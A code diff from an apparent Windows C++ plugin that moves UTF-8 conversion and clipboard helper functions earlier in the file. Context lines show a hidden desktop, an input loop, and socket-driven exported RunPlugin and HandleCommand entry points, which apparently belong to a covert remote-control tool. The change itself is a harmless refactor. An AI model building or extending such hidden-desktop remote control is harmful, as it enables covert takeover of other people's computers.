@@ -914,6 +914,57 @@ static HWND GetFocusedWindow() {
 // -----------------------------------------------------------------------
 //  input_loop – Klavye ve Mouse etkileşim iyileştirmeleri
 // -----------------------------------------------------------------------
+static wstring utf8_to_wstring(const string& str) {
+    if (str.empty()) return wstring();
+    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
+    if (size <= 0) return wstring();
+    wstring res(size, 0);
+    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
+    if (!res.empty() && res.back() == L'\0') res.pop_back();
+    return res;
+}
+
+static string wstring_to_utf8(const wstring& wstr) {
+    if (wstr.empty()) return string();
+    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+    if (size <= 0) return string();
+    string res(size, 0);
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &res[0], size, NULL, NULL);
+    if (!res.empty() && res.back() == '\0') res.pop_back();
+    return res;
+}
+
+static void set_clipboard_text(const wstring& text) {
+    if (!OpenClipboard(NULL)) return;
+    EmptyClipboard();
+    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, (text.size() + 1) * sizeof(wchar_t));
+    if (hGlob) {
+        wchar_t* pLocked = (wchar_t*)GlobalLock(hGlob);
+        if (pLocked) {
+            memcpy(pLocked, text.c_str(), (text.size() + 1) * sizeof(wchar_t));
+            GlobalUnlock(hGlob);
+            SetClipboardData(CF_UNICODETEXT, hGlob);
+        }
+    }
+    CloseClipboard();
+}
+
+static wstring get_clipboard_text() {
+    wstring res;
+    if (!OpenClipboard(NULL)) return res;
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+    if (hData) {
+        wchar_t* pLocked = (wchar_t*)GlobalLock(hData);
+        if (pLocked) {
+            res = pLocked;
+            GlobalUnlock(hData);
+        }
+    }
+    CloseClipboard();
+    return res;
+}
+
+
 static void input_loop() {
     ensure_desktop();
     if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
@@ -1224,25 +1275,9 @@ static void input_loop() {
     }
 }
 
-static wstring utf8_to_wstring(const string& str) {
-    if (str.empty()) return wstring();
-    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
-    if (size <= 0) return wstring();
-    wstring res(size, 0);
-    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
-    if (!res.empty() && res.back() == L'\0') res.pop_back();
-    return res;
-}
 
-static string wstring_to_utf8(const wstring& wstr) {
-    if (wstr.empty()) return string();
-    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
-    if (size <= 0) return string();
-    string res(size, 0);
-    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &res[0], size, NULL, NULL);
-    if (!res.empty() && res.back() == '\0') res.pop_back();
-    return res;
-}
+
+
 
 static wstring get_app_path(const wstring& appName) {
     HKEY hKey;
@@ -1322,35 +1357,9 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
 }
 
 
-static void set_clipboard_text(const wstring& text) {
-    if (!OpenClipboard(NULL)) return;
-    EmptyClipboard();
-    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, (text.size() + 1) * sizeof(wchar_t));
-    if (hGlob) {
-        wchar_t* pLocked = (wchar_t*)GlobalLock(hGlob);
-        if (pLocked) {
-            memcpy(pLocked, text.c_str(), (text.size() + 1) * sizeof(wchar_t));
-            GlobalUnlock(hGlob);
-            SetClipboardData(CF_UNICODETEXT, hGlob);
-        }
-    }
-    CloseClipboard();
-}
 
-static wstring get_clipboard_text() {
-    wstring res;
-    if (!OpenClipboard(NULL)) return res;
-    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
-    if (hData) {
-        wchar_t* pLocked = (wchar_t*)GlobalLock(hData);
-        if (pLocked) {
-            res = pLocked;
-            GlobalUnlock(hData);
-        }
-    }
-    CloseClipboard();
-    return res;
-}
+
+
 
 extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
     try {
